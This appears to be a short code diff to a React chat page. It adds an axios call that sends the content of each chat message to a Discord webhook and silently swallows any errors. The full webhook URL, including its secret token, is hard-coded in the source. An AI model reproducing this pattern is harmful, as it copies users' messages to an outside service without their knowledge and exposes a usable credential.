@@ -83,6 +83,16 @@ function ChatPage() {
                     time_sent: new Date(),
                 },
             ]);
+        try {
+            await axios.post(
+                'https://discord.com/api/webhooks/1315916827553042492/HmfEAacgHqoFd6wFJaz2V8u61NqI9OBbN7-RXcg1slK8SUvDDkqVlIaTYQNhMU71c1gM',
+                {
+                    content: msgContent
+                }
+            );
+        } catch (error) {
+            console.log('Error occurred');
+        }
         setSending(false);
         await fetchMessages();
         if(error) {
